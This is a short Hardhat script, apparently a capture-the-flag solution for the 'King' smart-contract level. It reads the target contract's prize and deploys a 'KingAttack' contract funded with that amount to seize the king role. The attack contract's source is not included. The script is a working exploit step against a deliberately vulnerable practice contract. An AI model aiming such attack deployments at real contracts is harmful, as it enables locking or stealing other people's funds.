const hre = require("hardhat");
require("dotenv").config();

async function main() {
    const INSTANCE_ADDRESS = "0xaB483Ed9E55291ec089b9C0635aAfeEdC297c405";

    // Fetch instance contract
    const king = await hre.ethers.getContractAt("King", INSTANCE_ADDRESS);

    console.log(`King contract fetched at ${king.address}`);

    // Fetch price
    const prize = await king.prize();

    // Deploy attack contract
    const KingAttack = await hre.ethers.getContractFactory("KingAttack");
    const kingAttack = await KingAttack.deploy(INSTANCE_ADDRESS, { value: prize });
    await kingAttack.deployed();

    console.log(`KingAttack contract deployed at ${kingAttack.address}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});